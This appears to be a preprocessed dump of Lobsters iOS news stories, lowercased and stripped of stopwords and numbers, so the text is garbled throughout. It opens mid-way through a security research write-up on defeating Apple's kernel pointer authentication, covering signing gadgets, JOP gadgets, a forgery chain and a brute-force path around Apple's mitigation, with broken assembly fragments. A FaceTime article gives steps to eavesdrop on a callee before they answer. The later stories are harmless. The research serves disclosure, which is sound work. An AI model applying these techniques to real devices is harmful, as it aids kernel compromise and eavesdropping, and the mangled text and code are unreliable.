setting bit system register mr msr isb pac stuff userspace mr orr msr isb also kernel code setsclears bit usually accompanied code disables interrupt check bit bootargs bootflags see excerpt infer bit control whether pac instruction kernel use key key bit set kernel key used otherwise userspace key used make sense need disable interrupt bit cleared since otherwise arrival interrupt may cause kernel code execute pac key still use causing pac validation failure would panic kernel pacenable bit another thing noticed investigating system register previously reserved bit used enabledisable pac instruction certain key looking exception vector syscall entry noticed additional code referencing bootflags setting certain bit marked reserved arm standard adrp constbootargs page add constbootargs pageoff ldr constbootargsbootflags cbnz mr tbnz orr set bit orr set bit orr set bit msr also bit conditionally cleared exception return tbnz ldr cbz mr clear bit clear bit clear bit msr bit documented reserved value arm find reference one xnu source pacdbenabled addpacdb authdb function enabled define sctlrpacdbenabled suggested bit least related enabling pac db key since bit mentioned file b set automatically via sctlrreserved speculated bit controlled pac key presumably leaving reference sctlrpacdbenabled code oversight guess bit control pacia bit control pacib bit control pacda bit control pacdb test theory executed following sequence pac instruction debugger setting field offset current thread pacia pacib pacda pacdb executing instruction set register xn value n result setting pac highlighted pacia pacib pacda pacdb result pacia pacib pacda pacdb seems confirm theory setting pac instruction worked expected setting except pacib effectively turned nops using fact exploitation tricky since overwriting kernel thread seem disable pac thread due additional check nonetheless existence pacenable bit interesting right non existence signing gadget point since systematic weakness apple robust design looking signing gadget usable via readwrite mean looking sequence code read pointer memory sign write back memory ca nt yet call arbitrary kernel address also need ensure code path actually triggerable either course normal kernel operation using iokituserclienttrap call primitive call kernel function already exists paciza pointer apple clearly tried scrub kernelcache obvious signing gadget occurrence pacia instruction either unusable wrapped code switch userspace pac key via way convince kernel perform pacia forgery using readwrite left paciza many occurrence paciza instruction useless since result nt written memory additionally gadget actually load store pointer almost always preceded autia would fail pointer signing nt already valid pac ldr cbnz cbz mov mov movk lsl autia paciza str thus appeared luck fourth weakness giving signing gadget pursuing dead end eventually wondered would actually happen paciza used sign invalid pointer validated autia assumed pointer would useless decided look arm pseudocode see would actually happen surprise standard revealed funny interaction autia paciza autia find authenticated pointer pac nt match expected value corrupts pointer inserting error code pointer extension bit auth restores upper bit address zero one based value bit computes check pointer authentication code check pass restored address returned check fails secondtop thirdtop bit extension bit pointer authentication code field corrupted ensure accessing address give translation fault bit auth bit ptr bit modifier bit k boolean data bit keynumber bit pac bit result bit originalptr bit errorcode bit extfield reconstruct extension field used adding pac pointer boolean tbi calculatetbi ptr data integer bottompacbit calculatebottompacbit ptr extfield replicate ptr tbi else originalptr extfield ptr pac computepac originalptr modifier k k check pointer authentication code tbi else pac bottompacbit ptr bottompacbit pac ptr result originalptr else errorcode keynumber keynumber result originalptr errorcode originalptr return result meanwhile paciza adding pac pointer actually sign pointer corrected extension bit corrupts pac extension bit originally invalid pseudocode addpac extptr extfield ptr pac computepac extptr modifier k k check ptr good extension bit corrupt pointer authentication code iszero ptr topbit bottompacbit isones ptr topbit bottompacbit pac pac critically pac instruction corrupt pac pointer invalid extension bit flipping single bit pac certainly invalidate pac also mean true pac reconstructed read value pac forgery pointer produced aut instruction sequence like one consist autia followed paciza used signing gadget even nt validly signed pointer begin flip single bit forged pac complete akey forgery strategy existence single paciza signing gadget begin construction complete forgery strategy key device running build stage pacizaforgery bit sleuthing reveals gadget found part function sysctlunregisteroid responsible unregistering sysctloid struct global sysctl tree function pacrelated code public source operation present pacenabled device listing relevant part function ida void sysctlunregisteroid sysctloid oidp sysctloid removedoidp null sysctloid oldoidp null bool haveoldoidp void handlerfield void handler context oidp oidkind nt enter oidp oidversion nt enter sysctloid firstsibling oidp oidparent first firstsibling oidp enter removedoidp null oldoidp oidp oidp oidparent first oldoidp oidlink haveoldoidp else handlerfield oldoidp oidhandler handler oldoidp oidhandler removedoidp handler take else else removedoidp null context handlerfield handlerfield ptrauthsignunauthenticated ptrauthauthfunction handler ptrauthkeyasia context ptrauthkeyasia get function called crafted sysctloid cause indicated path taken able forge arbitrary paciza pointer nt existing global paciza pointer function ca nt call directly using iokituserclienttrap primitive luck would several global paciza function pointer call several kernel extension register sysctls need unregister unloaded kexts often module termination function call sysctlunregisteroid kmodinfo struct describing kext contains paciza pointer module termination function best candidate could find part comapplenkelttp kext function perform deinitialization work calling sysctlunregisteroid global object thus pacizasign arbitrary pointer overwriting content calling via existing global paciza pointer reading oidhandler field flipping bit stage paciapacda forgery let u pacizaforge pointer want nice able perform paciapacda forgery well since could implement full bypass described section finding entry point kernel code execution next looked whether paciza primitive could turn pacia instruction kernelcache viable signing gadget likely candidate pacia pacda unknown function contains following instruction sequence mr msr isb ldr cbz mov pacia str ldr cbz mov pacda str mr orr msr isb pacibsp stp sp function body mostly harmless ldp autibsp mov ret make good candidate paciapacda instruction occur stack frame set ordinarily calling middle function cause problem function return since function epilogue tear frame never set since function stack frame set desired entry point use kernel call primitive jump directly instruction without causing problem course still another issue pacia pacda instruction use register kernel call primitive based iokituserclienttrap give u control register need figure get value want appropriate register fact already found solution problem earlier jop gadget searching kernelcache three kexts seem hold vast majority nonpac indirect branch fairplayiokit lskdiokit lskdiokitmse kexts even stand ida navigator bar island red sea blue since ida create function many instruction kexts seems kexts use sort obfuscation hide control flow make reverse engineering difficult many jump code performed indirectly register unfortunately case obfuscation actually make job attacker easier since give u plethora useful jop gadget protected pac specific use case control pc trying set writable memory region pointer want sign signing context jumping signing gadget eventually settled executing following jop program accomplish kernelbuffer context pointer mov br mov br mov br pacia str complete bypass strategy allows u forge arbitrary pac signature using key timeline sharing original kernel readwrite exploit december reported proofofconcept pac bypass built top voucherswap december poc could produce arbitrary akey pac forgery call arbitrary kernel function argument like nonpac device apple quickly responded suggesting latest io beta build mitigate issue build also fixed voucherswap bug could nt test directly inspect kernelcache manually found apple mitigated sysctlunregisteroid gadget used produce first paciza forgery build released december near beginning research pac long reported bypass apple thus like case voucherswap bug suspect another researcher found reported issue first apple fix order fix sysctlunregisteroid gadget autiapacia gadget apple added instruction ensure autia fails resulting invalid pointer used instead result paciza ldr oldoidp oidhandler cbnz cbz mov mov oldoidp oidhandler movk lsl oidhandler mov oidhandler autia autia handler handler xpaci xpac handler cmp paciza paciza xpac handler csel eq pacvalid paciza autia str change longer pacizaforge pointer unless already pacia forgery specific context bruteforce strategy mitigate fast straightforward strategy outlined enough time still susceptible brute forcing could nt test explicitly without exploit io able simulate long might take using exploit io problem even though nt existing paciaforgery pointer want pacizaforge use kernel call primitive execute gadget repeatedly different guess valid pac unlike instance authenticated pointer used guessing incorrectly wo nt actually trigger panic read result see whether guessed correctly case oidhandler field pac added incorrectly case oidhandler look like result failed autia looking back list pac pointer generated first experiment subsection observing runtime behavior compared extension bit pointer determine pac masked bit mean using pac million possibility experiment found invoking time took millisecond thus exhaustively checking million possible pac take around minute unless change nt notice single paciza forgery produced rest akey bypass strategy still possible initializingdeinitializing module time started produce noticeable slowdown nt identify source slowness suspect effort possible work around conclusion post put apple implementation pointer authentication soc used iphone x microscope describing observed behavior theorizing deviation arm reference might implemented hood analyzing system weakness would allow kernel attacker readwrite capability forge pac arbitrary pointer analysis culminated complete bypass strategy proofofconcept implementation allows attacker perform arbitrary akey forgery iphone x running io bypass sufficient achieving arbitrary kernel code execution jop strategy partially mitigated release io beta although indication might still possible bypass mitigation via bruteforce approach despite flaw pac remains solid worthwhile mitigation apple hardening pac soc clearly designed protect kernel attacker readwrite meant find systematic break design rely signing gadget easy patch via software complex new mitigation loophole uncommon first iteration however given fragility current bypass technique relying among thing single iouserclient class allows u overwrite ioexternaltrap one small number usable paciza gadget handful nonpac jop gadget introduced obfuscation believe possible apple harden implementation point strong forgery bypass become rare furthermore pac show promise tool make dataonly kernel attack trickier le powerful example could see apple adding something akin securitycritical attribute enables pac c pointer especially prone hijacked exploit ipcport ipkobject field mitigation would nt end bug class since sophisticated attacker could find way leveraging vulnerability kernel readwrite primitive would raise bar make simple exploit strategy like used voucherswap much harder hopefully le reliable pull
155,Lobsters,ios,Apple iOS,iPhone FaceTime bug lets you hear the audio of the person you are calling before they pick up,https://9to5mac.com/2019/01/28/facetime-bug-hear-audio/,iphone facetime bug let hear audio person calling pick,taken group facetime offline apple say issue addressed another update disable facetime io setting check youtube apple news check youtube apple news,update apple taken group facetime offline attempt address issue interim significant bug discovered facetime currently spreading virally social medium bug let call anyone facetime immediately hear audio coming phone person end accepted rejected incoming call apple say issue addressed software update later week naturally pose pretty big privacy problem essentially listen io user although still ring like normal covert nevertheless indication recipient side could hear audio second part expose video reproduced facetime bug iphone x calling iphone xr believed affect pair io device running io later iphone facetime bug start facetime video call iphone contact whilst call dialling swipe bottom screen tap add person add phone number add person screen start group facetime call including audio person originally called even accepted call yet look like ui like person joined group chat actual device still ringing lock screen whilst call ringing swipe bottom screen add call damage potential real listen soundbites iphone user ongoing conversation without ever knowing could hear apple fix bug clear defend attack either aside disabling facetime altogether stand phone ringing incoming facetime request person end could listening also found person press power button lock screen video also sent caller unbeknownst situation receiver hear audio know transmitting audio video back perspective see accept decline another update seems way triggering video feed eavesdrop also replicated problem iphone calling mac default mac ring longer phone act bug even longer duration apple said issue fixed software update later week concerned disable facetime io setting check youtube apple news video ftc use income earning auto affiliate link check youtube apple news video
156,Lobsters,ios,Apple iOS,Progressive Web App Progress in iOS 12.2 Beta 1,https://medium.com/dev-channel/progressive-web-app-progress-in-ios-12-2-beta-1-build-16e5181f-a18cd05ca361,progressive web app progress io beta,progressive web app progress io beta build beta release note pwa feature detector research paper research paper web share api support two checkmarks web share api level demo pwa feature detector demo outofscope link add home screen apps use losing state completely documentation sfsafariviewcontrollerconfiguration keeping state multitasking make pwas added home screen keep state webkit bug twitter lite trivago pwa related work medium query detect issue still respecting web app manifest icon icon specified web app manifest configure web application sam thorogood pwacompat io add home screen manifest io add home screen web app manifest medium capability api intersection observer experimental feature medium capability api demo pwa feature detector demo new feature lazyloading image video iframes late game version polyfill demo demo conclusion call action one heck release progressive web apps henrik joreteg positive experience htmlanchorelement download sending feedback chris dumez let u keep webkit team busy filing bug commenting existing one pwa feature detector push notification webkit bug background sync webkit bug storage estimation webkit bug fixed getusermedia webkit bug web app manifest icon webkit bug add home screen webkit bug web share target api webkit bug fixed web share api level webkit bug navigation preload api webkit bug fixed text asynchronous clipboard api webkit bug see issue file new bug update maciej stachowiak acknowledgement mike hartington maximiliano firtman max article ≈°ime vidas sam thorogood,progressive web app progress io beta build regular passionate io user strong belief web betatest new io build soon get hand main motivation see come progressive web app feature new io version come new version safari yet change safari tend almost never get highlighted io release note beta release note exception routine fire pwa feature simple testing tool described accompanying research look potential change myselfresearch paper web view analysis progressive web app feature mean web access web browser web share api support last couple release two checkmarks offline capability payment request however beta surprise present pwa feature detector tool reported web share supported web share api level defines api sharing text link content arbitrary destination user choice tested official demo worked like charm brilliant news thanks apple pwa feature detector running io beta showing support web share api left web share api action demo right outofscope link add home screen apps add app home screen io run environment called webapp far tell public documentation apple engineer alike use term refer problem far apps opened regular safari soon outofscope link clicked leading app losing state completely also see next paragraph changed link finally open something look like customized sfsafariviewcontroller however without share sheet reload button would reader mode button io programmer looking documentation sfsafariviewcontrollerconfiguration judging seen sfsafariviewcontroller used past seems userconfigurable setupoutofscope link viewed twitter lite pwa left native twitter app right reload button share sheet also reader mode button new experience leftkeeping state multitasking kept maybe biggest change end seems like work underway finally make pwas added home screen keep state context multitasking away app added home screen came back would always reload lose state completely reported issue webkit bug closed core issue webkitthis appears changing better tried new experience twitter lite started tweet multitasked different app came back find previously started tweet ready continued second example screenshot series see searching hotel trivago pwa going back home screen finally switching back app find search state preservedin many case screenshot apple multitasking ui still white screen case actually reflected last state hopefully improved future preserving state seems work sometimes always occasionally trapped within view twitter app could tap ui element even back button brought back start screen trivago app redo searchside note apps provide back button relied android systemlevel back button see related work medium query detect issue behavior mean permanently locking user always make sure provide back button first trivago pwa shown clock left switching back home screen middle finally restored state clock right still respecting web app manifest icon light shadow little icon specified web app manifest still ignored use apple oldschool way configure web application link relation outlined code sample use sam thorogood pwacompat library link rel appletouchicon href touchiconiphonepng link rel appletouchicon size href ipadpng link rel appletouchicon size href link rel appletouchicon size href little test tool called io add home screen manifest list gazillion well almost differently sized icon one io end using still safarigenerated screenshotbased oneios add home screen tool left showing io still ignores icon specified web app manifest right medium capability api intersection observer experimental feature want continue post positive note couple surprise several new apis made safari experimental webkit feature list setting app navigate safari advanced experimental feature activate want highlight medium capability api allows website make optimal decision picking medium content user api expose information decoding encoding capability given format also output capability find best match based device display tested api demo macbook pro say good go iphone x tell configuration supportedmedia capability api support forth checkmark pwa feature detector left demo right let app know medium configuration supported play smoothly power efficientother new feature second pwarelated yet still important context api added experiment intersectionobserver api essential performant lazyloading image video iframes safari really late game one desktop safari technology preview gained support version finally great api hopefully soon mobile safari graduate current experimental status longer rely polyfillwhat also new likewise exactly pwa feature input typecolor support playing demo would maybe wish longpress support granular color selection current implementation probably work well enough use case input type color action democonclusion call action concluding one heck release progressive web apps really happy apple engineer listening user feedback another example henrik joreteg recent positive experience getting htmlanchorelement download attribute added one easily create downloads dynamicallywhile admittedly time might feel like shouting forrest sending feedback help webkit engineer chris dumez put call action universally great pwa support safari user let u keep webkit team busy filing bug commenting existing one listening experimental feature included pwa feature detector make safari four checkmarks webkit team add want push notification support chime webkit bug want background sync support chime webkit bug want storage estimation support chime webkit bug fixed want getusermedia support pwas chime webkit bug want web app manifest icon pwas chime webkit bug want add home screen support pwas chime webkit bug want web share target api support chime webkit bug fixed want web share api level support file sharing chime webkit bug want navigation preload api support chime webkit bug fixed text want asynchronous clipboard api support chime webkit bug see issue file new bug duplication fine according webkit team use company email address tell need feature many io user missing outupdate apple maciej stachowiak clarified following point team would like receive feedback bug tracker acknowledgementsthere couple likeminded io beta nerd helped unearth get detail feature twitter discussion mike hartington maximiliano firtman read max article subject ≈°ime vidas sam thorogood thank
158,Lobsters,ios,Apple iOS,The iOS Menu,https://codea.io/blog/the-ios-menu/,io menu,codea snapkit building io menu visually brian coyner looked source create effect public beta twitter detailing io menu,codea ipad app creative coding developing universal version time hard take complicated eightyearold ipad coding environment bring iphone many damn feature need work many damn configuration autolayout take care many issue thanks snapkit take care important design stuck design universal version codea code editor year might even two one many sketch file iteration code editor scale realised six month ago using mac using menu need thing menu codea trying solve problem solved decade set make best menu could make io code editor iphone simple apps menu necessary great codea simple app nothing discoverable compared option considered menu exactly discoverable pull list named feature complete shortcut key keyboard attached activate feature tapping dragging finger releasing hamburger menu sidedrawers whatever want call conventional way bury additional often unrelated functionality app much heavier good oldfashioned menu bar often pull whole modal sidethingy maybe slide content right context switch brain menu categorise item common plaintext heading appear disappear without fanfare wanted menu looked beautiful looked like io felt great building io menu visually part get technical knew wanted beginning rounded translucent menu drop shadow thing translucency io easy use uivisualeffectview light dark blur effect whatever behind view get nice blurry rounding menu harder use layer cornerradius property round corner wanted rounded part menu pop menu button like bezier path used clipping mask menu content note quicklooked uibezierpath xcode debugger image seriously cool quicklook hard generate uibezierpath create cashapelayer assign layermask uivisualeffectview get u rounding view cast drop shadow yeah get nice blurred shadow gross left happens put shadow visual effect viewright appearance want sure seen problem solved apple one apps remembered io map app cool draggable panel us visual effect view drop shadow want shadow like surely apple solved brian coyner looked apple implementation map image apple map shadow source baked shadow image edge transparent middle great piece create effect going work menu menu complex rounded shape relative size shape change based text length wanted vary thing like corner radius shadow radius shadow offset want reexport static image create inverted shadow mask image apply layer mask rasterised drop shadow image basically create solid image transparent region middle shape menu bezier path turned really easy though took bit experimenting key let imagerenderer uigraphicsimagerenderer size shadowviewboundssize let shadowmask imagerendererimage context uicolorwhitesetfill contextfill shadowviewbounds pathfill clear alpha create shadow mask image filling image white filling bezier path see clear colour give u image look like shadow mask kept quicklook chrome see transparent cutout region middle apply layer mask rasterised drop shadow done menu arbitrary shape drop shadow blurred background video new app shade public beta right codea shade make use menu extent ton detail covered let know twitter want see follow find part two detailing io menu
159,Lobsters,ios,Apple iOS,"Introducing Square In-App Payments SDK for iOS, Android & Flutter",https://medium.com/square-corner-blog/introducing-square-in-app-payments-sdk-1fc93b32814c,introducing square inapp payment sdk io android flutter,http developersquareupcomblog mobile accounted sale square inapp payment sdk online inperson inapp brushfire jorin slaybaugh technology lead brushfire work get started visit documentation site learn head developer dashboard create new application add sdk customize ux match look feel app instantiate card entry view adam robinson chief product officer pepperhq pepperhq documentation http squareupcomdevelopers squreslack additional reading,head moved like continue keeping latest technical content square please visit u new home http developersquareupcomblogit surprise mobile commerce continues gain popularity example mobile accounted sale black friday cyber monday built square developer platform past year developer community asking ability take payment square natively within mobile app running buyer device listened community worked tirelessly deliver inapp payment experience truly life square standardstoday thrilled launch square inapp payment sdk enables developer accept squarepowered payment within mobile apps allows buyer securely pay physical good service purchased mobile app well add credit card profilethe square inapp payment sdk round square omnichannel developer platform meaning developer build online inperson inapp payment solution square mean le time spent building maintaining multiple payment integration also mean backoffice reporting seamlessly unified single system making easy business make datadriven decisionsbrushfire fastgrowing ticketing registration platform using sdk beta program able quickly integrate square inapp payment sdk mobile apps use square power kiosk event implementing inapp payment sdk mobile app allowed customer easily buy ticket marquee event increasing conversion square inapp payment sdk painless easy use loved technical standpoint allowed u something literally impossible u able easier ever matter developer jorin slaybaugh technology lead brushfireas apis sdks square handle payment complexity like maintaining pci compliance mitigating fraud managing dispute keeping buyer data secure behalf developer use square inapp payment sdkhow workscustomizable component square inapp payment sdkthe sdk feature interactive ux securely collect credit card information buyer tokenizes developer need deal raw credit card information kept pci scope sdk allows developer fully customize different piece ux match look feel appdigital wallet support square inapp payment sdkdigital wallet like apple pay google pay also supported help developer increase conversion provide smoother buyer experience developer also option securely storing card file repeat buyer reenter card next timeget startedit easy get started inapp payment visit documentation site learn head developer dashboard create new add customize ux match look feel app instantiate card entry viewiosandroidwhen buyer enter credit card detail app sdk tokenizes detail return nonce singleuse token refers credit card detail send nonce backend use connect apis charge customer create card file sdk square took care lot heavy lifting storing card information processing transaction square inapp payment sdk slicker implementation option market felt frictionless beginning able customize look feel flow look way client want still feel native app trustworthy honest adam robinson chief product officer pepperhqpepperhq company creates customized merchantbranded mobile apps hospitality company looking mobile payment order ahead solution morewe excited see build sdk square inapp payment sdk available united state canada united kingdom australia japan starting today learn square inapp payment sdk documentation learn square developer platform visit http squareupcomdevelopers join community squreslacknote square support apple pay google pay usd transactionsadditional reading
160,Lobsters,ios,Apple iOS,Attaching sources to iOS/macOS binaries compiled on another machine,https://medium.com/@maxraskin/background-1b4b6a9c65be,attaching source iosmacos binary compiled another machine,attaching source iosmacos binary compiled another machine background seeking solution stackoverflow little symbol iosmacos attaching dsym manually please http http wwwexamplecommystuffframeworkdsymzip found http lldbllvmorgsymbolshtml http update july script,attaching source iosmacos binary compiled another machinebackgroundour ci build several io framework deployed artifactory ready consumption clientsrecently framework crash used client naturally wanted attach offending app debugger step code ala trivially xcode simple way telling symbol source directory atseeking solutionnaturally went ahead google find proper solution turned stackoverflow put bounty questionsome time later received reply guy go name jim ingham quick search curiosity turn one lldb principal engineer apple awesome first order source knowledge little symbol iosmacosat first misconception enough symbolic source map data embedded debug binary framework thats enough fact data read either two place intermediate object file machine frame compiled ci machine case portable unless hack around shoudln dsym package generated debuginformationformat set dwarfwithdsymthis portable usable however absolute path source embedded itattaching dsym manuallyafter getting answer stackoverflow went ahead tried manual process attaching source simple follows dsym machinei started xcodeset breakpointlaunch appwhen breakpoint got hit typed following command lldb console adddsym pathtothedsymimage lookup vn someglobalsymbolzthis printed absolute path source code file symbol resides eg usersjenkinsmyprojectsrcsomeglobalsymbolsourcecppnow remap source path usedsettings set targetsourcemap usersjenkinsmyprojectsrcsomeglobalsymbolsourcecpp usersmaxmyprojectsrcsomeglobalsymbolsourcecppnote map multiple sourcemaps thus setting set targetsourcemap able step source symbol binary framework debug please process previous section tedious fun use time automated ityou grab python script http usage example python dsymsymbolizerpy dsymurl http wwwexamplecommystuffframeworkdsymzip sourcepath usersmemyselfandimystuffsources binarypath usersmemyselfandimyprojectpodsmystuffmystuffframeworka ruby version script found herethanks fellow coworker ben asher making ruby portnote ruby port requires dsymnow automation actually whats written previous section actually whats described http lldbllvmorgsymbolshtml guesstimation thrown script look binary try match embedded path local path using following algorithm downloads dsym remote urldsyms put dsymsexecutes nm utility binary guestimate embedded source path using following logic let assume sourcepath mypath potentialoriginalpath remoteplacefoobarbaz attempt see mypathbaz exists mypathbarbaz mypathfoobarbaz return generates mapping plist architecture mapping data put contentsresources within dsym packagehere example plist xml version encoding doctype plist public appledtd plist http plist version dict key dbgarchitecture key string string key dbgbuildsourcepath key string userssharedjenkinshomejobsmyappworkspacemyappcore string key dbgdsympath key string usersmaxdsymsmyappdsym string key dbgsourcepath key string usersmaxprojmyappmyappcore string key dbgsymbolrichexecutable key string usersmaxprojmyappmyappiospodsmylibcorelibmyappframeworkmyapp string dict plist run xcode lldb automatically pick dsym let debug binary machine note must rerun script binary get changed happy debugging update july also ruby port script thanks go coworker ben ashernote ruby port requires dsym local path
161,Lobsters,ios,Apple iOS,Apple iOS 12.1.2 bug breaks cellular data and calls,https://www.forbes.com/sites/gordonkelly/2018/12/22/apple-ios-12-1-2-problem-iphone-xs-max-xr-mobile-data-cellular-4g-cannot-load-internet/,apple io bug break cellular data call,apple north carolina legal concern,promising start io going bad worse iphone owner apple legally motivated rush push update need discussion serious consequence many iphone owner blindly upgrade io report flooding around world cut mobile data service apple claim address issue could affect cellular connectivity turkey iphone xr iphone x iphone x max seem ironic given problem expanded model iphone across continent apple io causing serious mobile data problem user around world apple tracking complaint twitter alone iphone owner suffering mobile data loss upgrading io found north america south america europe asia united state appears hit particularly hard thanks apple applesupport christmas present since updating iphone io ca nt access cellular data reset device ca nt activate anymore service better fix update soon new york applesupport iphone x wifi connection issue since updated io maryland phone wo nt connect cellular network update north carolina applesupport next io update coming son wife phone able make receive phone call download mississippi shout apple applesupport installed bricked cellular thanks rushing update connecticut anyone else lose ability use phone actual phone upgraded io iphone heck apple even call applesupport make reservation applestore next week texas applesupport hi fix available network connectivity issue experiencing iphone since updating latest io new england applesupport updated io ca nt call textreceive call text wisconsin intermittent service error iphone since io update hoping would fix nope got new sim provider problem persists one minute gone next p turkey apple applesupport uscellular nebraska tip iceberg india also badly hit complaint flying example get picture apple official comment company official twitter support telling user restart phone update carrier setting see helping good news horizon apple already started beta testing io release date unknown appears motivated legal concern still would astonishing apple acknowledge try fix mobile data problem time would strongly suggest steer clear io scale io problem always impossible know given sheer number iphones circulation since io exists primarily loophole get apple chinese sale embargo see reason risk mobile data connection follow gordon twitter facebook google forbes apple io release upgrade apple pushing legally motivated io upgrade iphones iphone x v iphone x max difference iphone x v iphone xr difference
162,Lobsters,ios,Apple iOS,WireGuard for iOS,https://lists.zx2c4.com/pipermail/wireguard/2018-December/003694.html,wireguard io,wireguard io app store jason http http team wireguardcom jason http team wireguardcom http http wwwwireguardcomtodo http information wireguard mailing list,wireguard io app store jason donenfeld jason thu dec cet hi everybody thanks extremely useful feedback received testflight wireguard io roopesh eric released beta app store http depending region apple caching semantics link might take unknown amount time begin working apple requested video app running physical device review app showing work curiosity noniphone folk see http le interface android designed simple systemlike possible still exposing feature flexibility wireguard please keep feedback coming moment especially interested report people transitioning mobile wifi using tmobile network within u generally bug report complete exported log welcome continue refine beta release interested development app please get touch team wireguardcom likewise always looking helping hand variety task including limited io macos android window web development wireguardcom could use love various kernel forth enjoy jason mon nov pm jason donenfeld jason wrote hey folk last week roopesh hard work wireguard io app today happy share likelybuggyandbroken testflight run phone http usual use risk especially since alpha quality please let u know bug find send team wireguardcom current todo list life linked via main project todo list io person want contribute code happy board app cost requires email address sign manage tunnel cloud kidding like rest wireguard io app free open source make rather tasteless joke rather surprising quantity people encouraging io stuff proprietary paid software apple user pay open source cool iphone folk nt care get away charging none vpn player open source mobile implementation even apple likely accept paid software app store forth usual much prefer community project closed one like everything else floss enjoy let u know bug run sure plenty regard jason http http wwwwireguardcomtodo http information wireguard mailing list
163,Lobsters,ios,Apple iOS,Ditching Android - 6 Weeks On,https://kevq.uk/ditching-android-6-weeks-on/,ditching android week,ditching android better personal opinion comment annoyance conclusion subscribe click,around week ago decided ditching android favour io bought cheap iphone se set migrating android really want drag promise last article would provide update islong story short really enjoying io work really well able replace every app used android overall actually prefer workflow ioswhich better question better moot opinion android io good bad different way people like fact tinker android whereas others see negative people like build quality apple device others think overpricedit personal opinionpersonally prefer io need something tinker inclination tinker mobile device opinion io private androidthe commentsmy last article hit front page hacker news received lot traffic also spawned lot comment constructive appreciated however wanted answer couple recurring theme came comment clearly advert apple case think would chosen year old device also single link apple article advert site using google anymore appear google news feed degoogled mean google crawler stop hitting site google tending analysis nothing site root android install name rom like said time inclination playing around mobile device way want pick use put google spying hide one came lot really surprised everyone something hide whether fact really serial killer fact want anyone anything looking private email significant bank statement credit history number thing truly nothing hide please feel free post email facebook credential comment actually annoyance experienced since ditching android main one typing think combination smaller screen flip multiple keyboard layout punctuation number getting used thoughthe touch screen also feel le responsive requiring number tap get touch register sometimes could older device smaller screen recall issue ipadi heard horror story battery life awful iphones actually opposite use phone day still well battery remaining may social medium account phone checking every second either way battery life greatconclusionthe process ditching android painless iphone still getting latest io update something android device severely lacking despite modeli love form factor little se refreshing phone pocket feel like house brick also sold android device bought iphone se profit overall happy decided move iphone ever move back doubt likely move option decent alternative hit market really see happening time soonsubscribe receive monthly email update preview upcoming post find click
164,Lobsters,ios,Apple iOS,We Broke Into A Bunch Of Android Phones With A 3D-Printed Head,https://www.forbes.com/sites/thomasbrewster/2018/12/13/we-broke-into-a-bunch-of-android-phones-with-a-3d-printed-head/#46b703c11330,broke bunch android phone head,two head better valuable company world use head face,facial recognition cropping everywhere shopping mall workplace likely something scanning face every day rather invade privacy facial recognition smartphones supposed protect digital life snoop android customer though look away screen tested four hottest handset running google operating system apple iphone see easy break head android opened fake apple phone however impenetrable two head better head printed backface birmingham uk ushered domelike studio containing camera together combine take single shot make full image image loaded editing software error ironed instance missing piece nose backface construct model printer build layer british gypsum powder final touchups colouring added life size head ready within day proud owner uncanny almostspectral version visage head made backface studio birmingham uk forbes test used reallife head register facial recognition across five phone iphone x four android device lg thinq samsung samsung note oneplus held fake head device see device would unlock four android phone spoof face able open phone though differing degree ease iphone x one never fooled disparity android device security hack instance first turning brand new lg actually warns user turning facial recognition face recognition secondary unlock method result phone le secure say noting similar face unlock phone surprise initial testing head opened straightaway yet filming appeared lg updated improved facial recognition making considerably difficult open lg spokesperson told forbes facial recognition function improved device second recognition step advanced recognition lg advises setup lg constantly seek make improvement handset regular basis update device stability security added facial recognition seen secondary unlock feature others like pin fingerprint similar warning samsung sign phone could unlocked someone something look like note use facial recognition le secure using pattern pin password oddly though setting device first presented option unlocking facial iris recognition whilst iris recognition nt duped fake head mistedover eye facial recognition tricked albeit need try different angle lighting first note feature turn faster recognition manufacturer admittance le secure slower option matter case head unlocked setting though take little effort lighting angle slower option went slower version lg latter proving trickier break samsung spokesperson told forbes facial recognition convenient action open phone similar swipe unlock action offer highest level biometric authentication fingerprint iris lock phone authenticate access samsung pay secure folder oneplus came neither warning android phone choice slower secure recognition despite scifi style face scanning graphic registering face phone instantly opened presented fake head undoubtedly least secure device tested oneplus spokesperson said designed face unlock around convenience took corresponding measure optimize security always recommended use passwordpinfingerprint security reason face unlock enabled secure apps banking payment constantly working improve technology including face unlock luck iphone x though apple investment tech saw company work hollywood studio create realistic mask test face id clearly paid impossible break model microsoft appeared done fine job new window hello facial recognition also nt accept fake head real little surprise two valuable company world offer best security use head face anyone worried anyone device compromised fake head either method others perhaps consider using facial recognition instead use strong alphanumeric passcode recommended matt lewis research director cybersecurity contractor ncc group focus secret aspect pin password added reality biometrics copied anyone enough time resource objective invest try spoof biometrics
166,Lobsters,ios,Apple iOS,Proof That iOS Still Hasn‚Äôt Gotten Undo Right,https://daringfireball.net/2018/12/ios_still_hasnt_gotten_undo_right,proof io still gotten undo right,proof io still gotten undo right procreate pocket pixelmator pro apple story procreate pocket story pixelmator pro since wrote month ago screenshots apple note linea go iphone teach edition human interface guideline,proof io still gotten undo right wednesday december reading apple app store award something jumped iphone mac apps year image editor procreate pocket iphone pixelmator pro mac excellent apps welldeserving award apple story procreate pocket story pixelmator pro article visible io macos mojave app store app feel like linking aol content struck paragraph apple story procreate pro even curious hobbyist drawn pun intended simple user interface creating readily go back remove rogue line drew tapping two finger mean undo stroke tap three reappear whole story seven paragraph long one devoted explaining invoke undo redo inadvertently part app store editorial team scathing indictment state io user interface standard reading word much would wager apple story pixelmator pro mac mention invoke undo redo would bet house even never even heard pixelmator course know invoke undo redo mac app edit undo edit redo shortcut fact even placement edit menu always every mac app first two item menu undo position menu keyboard shortcut since undo redo powerful essential command way invoke mac universal convention almost year redo came year later recall correctly io fact standard convention undo awful indiscoverable shake undo wrote month ago mentioned piece io support shortcut hardware keyboard connected ipad onscreen keyboard undoredo button text editing ipad undoredo available good systemwide convention mac undo redo invoked way action app everything editing text making illustration trashing moving file mail message common convention undoredo io drawing apps circular arrow button counterclockwise undo clockwise redo thankfully icon used undoredo ipad onscreen keyboard consistency completely lost see screenshots apple note linea go iphone speaks weak convention procreate pocket could something different totally different multifinger tap onscreen button get away celebrated apple saying procreate twothreefinger tap better worse onscreen button well stay tuned see thinking screen space iphone precious reduction onscreen button win term reducing ui clutter maximizing screen space available showing content illustration also sure twothreefinger tap fast used developer drawing app io forced make choice obvious thing add persistent button consuming precious screen real estate nonobvious thing implement undoredo gesture like procreate multifinger tap stupid thing rely shake undo even though people know shake undo exists even probably hate andor feel silly personally designing io drawing app go first route follow apple note lead button linea support two threefinger tap addition explicit button quasiconvention procreate credit clearly know multifinger tap gesture unusual intuitive utterly nondiscoverable first thing first launch app teach think io user interface convention shallow widely wildly inconsistent app proclaimed apple best year start first thing see launch teaching use undo sad state affair apple created wideranging human interface guideline 